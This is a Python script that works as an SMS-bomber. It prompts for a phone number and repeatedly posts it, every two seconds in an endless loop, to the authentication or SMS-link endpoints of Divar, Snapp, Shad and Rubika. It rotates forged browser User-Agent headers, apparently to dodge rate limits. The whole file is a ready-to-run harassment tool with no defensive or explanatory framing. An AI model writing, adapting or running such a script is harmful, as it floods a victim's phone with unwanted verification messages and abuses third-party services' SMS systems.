import requests
import time
import random


#_____________________________________________________________________________


number = input("Enter your phone number (without 0 ) :")

url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

#____________________________________________________________________________

url_snapp = "https://api.snapp.ir/api/v1/sms/link"
json_snapp = {"phone" :"+98" + number }
#_____________________________________________________________________________

url_shad = "https://shadmessenger134.iranlms.ir/"
json_shad = {"phone" :"+98" + number }

#____________________________________________________________________________
 
url_rubika = "https://messengerg2c202.iranlms.ir/"
json_rubika = {"phone" :"+98" + number}

#_____________________________________________________________________________


#_____________________________________________________________________________
#_____________________________________________________________________________
#_____________________________________________________________________________
#_____________________________________________________________________________
#_____________________________________________________________________________
#_____________________________________________________________________________



heads = [
    {
    "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept':  '*/*'
    },
    {
    "User-Agent": 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept':  '*/*'
    },
    {
    "User-Agent": 'Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/120.0',
    'Accept':  '*/*'
    },
    {
    "User-Agent": 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/120.0',
    'Accept':  '*/*'
    },
    {
    "User-Agent": 'Mozilla/5.0 (Windows NT 9.1; Win64; x64; rv:76.0) Gecko/20100101 Firefox/120.0',
    'Accept':  '*/*'
    },
]


#___________________________________________________________________________



while True:
    random_head = random.choice(heads)

    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req)
#_____________________________________________________________________________
    req1 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req1)
#_____________________________________________________________________________
    req2 = requests.post(url=url_shad,json=json_shad,headers=random_head)
    print(req2)
#_____________________________________________________________________________
    req3 = requests.post(url=url_rubika,json=json_rubika,headers=random_head)
    print(req3)

    time.sleep(2)




ttpt